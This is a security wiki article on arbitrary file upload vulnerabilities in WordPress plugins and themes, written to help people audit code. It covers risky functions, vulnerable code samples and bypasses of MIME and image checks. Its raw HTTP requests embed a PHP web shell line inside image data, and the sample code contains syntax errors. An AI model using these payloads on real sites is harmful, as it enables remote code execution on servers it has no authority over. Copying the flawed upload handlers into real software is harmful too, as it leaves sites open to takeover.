---
title: Arbitrary File Upload
contributors:
    - rafiem
---
## Introduction

This article covers cases of possible Arbitrary File Upload on WordPress. This includes improper file input handling inside of the plugin/theme which can be used to arbitrarily upload files including `.php` files to further achieve Remote Code Execution (RCE).

## Files Input

The most common way to trace if a plugin/theme has a file handling from user input is via the `$_FILES` PHP variable. 

Another way that is most of the time missed by hackers is via [`WP_REST_Request::get_file_params`](https://developer.wordpress.org/reference/classes/wp_rest_request/get_file_params/) function. This function retrieves multipart file parameters from the body of a custom REST API route registered by the plugin/theme.


## Useful Functions

Several functions could be useful to identify a possible Arbitrary File Upload vulnerability:

- PHP related
    - [move_uploaded_file](https://www.php.net/manual/en/function.move-uploaded-file.php)
    - [file_put_contents](https://www.php.net/manual/en/function.file-put-contents)
    - [fwrite](https://www.php.net/manual/en/function.fwrite)
    - [fputs](https://www.php.net/manual/en/function.fputs.php)
    - [copy](https://www.php.net/manual/en/function.copy.php)
    - [fputcsv](https://www.php.net/manual/en/function.fputcsv.php)
    - [rename](https://www.php.net/manual/en/function.rename.php)
- WordPress related
    - [WP_Filesystem_Direct::put_contents](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/put_contents/)
    - [WP_Filesystem_Direct::move](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/move/)
    - [WP_Filesystem_Direct::copy](https://developer.wordpress.org/reference/classes/wp_filesystem_direct/copy/)

## Compressed File Extraction

One of the processes to upload a file is through an extraction of the compressed file. The compressed itself can vary from zip, gz, tar, rar, xz, 7z, etc. Most of the time, the developer forgets to implement a pre-check before the extraction process and it could lead to users uploading arbitrary files if the user can control the filename and the content of the extracted file.

Here are several functions that can be used to decompress a file:

- [`ZipArchive::extractTo`](https://www.php.net/manual/en/ziparchive.extractto.php)
- [`PharData::extractTo`](https://www.php.net/manual/en/phardata.extractto.php)
- [`unzip_file`](https://developer.wordpress.org/reference/functions/unzip_file/)

```php
add_action("wp_ajax_unpack_fonts", "unpack_fonts");

function unpack_fonts(){
    $file = $_FILES["file"];
    $ext = end(explode('.',$file_name));

    if($ext !=== "zip"){
        die();
    }
    
    $file_path = WP_CONTENT_DIR + "/uploads/" + $file["name"];
    move_uploaded_file($file["tmp_name"], $file_path);

    $zip = new ZipArchive;
    $f = $zip->open($file_path);

    if($f){
        $zip->extractTo(WP_CONTENT_DIR + "/uploads/");
        $zip->close();
    }

}
``` 

To bypass the above check, basically we need to prepare a valid zip file and add a malicious PHP file inside of the zip file. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:

```http
POST /wp-admin/admin-ajax.php?action=unpack_fonts HTTP/1.1
Host: localhost
Content-Length: 227
Cookie: <AUTHENTICATED_USER_COOKIE>
Connection: close

------WebKitFormBoundaryNSpLEsDZWYvEGYO1
Content-Disposition: form-data; name="file"; filename="pwn.zip"
Content-Type: application/zip

<MALICIOUS_ZIP_METADATA>
------WebKitFormBoundaryNSpLEsDZWYvEGYO1--

```

## Bypass Techniques

Some of the conditions may make the file upload process secure, however, these specific conditions can still be bypassed to achieve an Arbitrary File Upload

### MIME Type Check

Developers often only check for the file's MIME content type before performing the upload process. This check alone is not enough to prevent Arbitrary File Upload since the attacker just needs to insert or append a malicious string like PHP code into a valid acceptable file MIME type.

Several functions could be used to check for a file's MIME type. Here are several functions that can be used to check for MIME type:

- [mime_content_type](https://www.php.net/manual/en/function.mime-content-type.php)
- [exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php)
- [finfo_file](https://www.php.net/manual/en/function.finfo-file.php)

Example of vulnerable code :

```php
add_action("wp_ajax_nopriv_upload_image_check_mime", "upload_image_check_mime");

function upload_image_check_mime(){
    $file = $_FILES["file"];
    $file_type = mime_content_type($file["tmp_name"]);
    $file_path = WP_CONTENT_DIR + "/uploads/" + $file["name"];
    
    if(in_array($file_type, get_allowed_mime_types())){
        move_uploaded_file($file["tmp_name"], $file_path);
        echo "file uploaded";
    }
    else{
        echo "file mime type not accepted";
    }

}
```

To bypass the above check, basically we need to prepare a valid PNG file and append a malicious PHP code on the PNG file metadata. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:

```http
POST /wp-admin/admin-ajax.php?action=upload_image_check_mime HTTP/1.1
Host: localhost
Content-Length: 227
Connection: close

------WebKitFormBoundaryNSpLEsDZWYvEGYO1
Content-Disposition: form-data; name="file"; filename="pwn.php"
Content-Type: image/png

<PNG_IMAGE_METADATA>
<?php echo system($_GET["id"]); ?>
------WebKitFormBoundaryNSpLEsDZWYvEGYO1--
```

### Image Related Check

Most of the file upload process is for an image type of file. Sometimes, developers only check for conditions that are related to an image file. One of the common functions to be used for image-related checks is [`getimagesize`](https://www.php.net/manual/en/function.getimagesize.php) function.

Example of vulnerable code :

```php
add_action("wp_ajax_nopriv_upload_image_getimagesize", "upload_image_getimagesize");

function upload_image_getimagesize(){
    $file = $_FILES["file"];
    $file_path = WP_CONTENT_DIR + "/uploads/" + $file["name"];
    $size = getimagesize($file["tmp_name"]);
    $fileContent = file_get_contents($_FILES['file']);

    if($size){
        file_put_contents($file_path, $fileContent);
        echo "image uploaded";
    }
    else{
        echo "invalid image size";
    }

}
```

To bypass the above check, basically we need to prepare a valid image file and append a malicious PHP code on the image file metadata. Below is the example of a raw HTTP request to trigger the Arbitrary File Upload:

```http
POST /wp-admin/admin-ajax.php?action=upload_image_getimagesize HTTP/1.1
Host: localhost
Content-Length: 227
Connection: close

------WebKitFormBoundaryNSpLEsDZWYvEGYO1
Content-Disposition: form-data; name="file"; filename="pwn.php"
Content-Type: image/jpeg

<JPEG_IMAGE_METADATA>
<?php echo system($_GET["id"]); ?>
------WebKitFormBoundaryNSpLEsDZWYvEGYO1--
```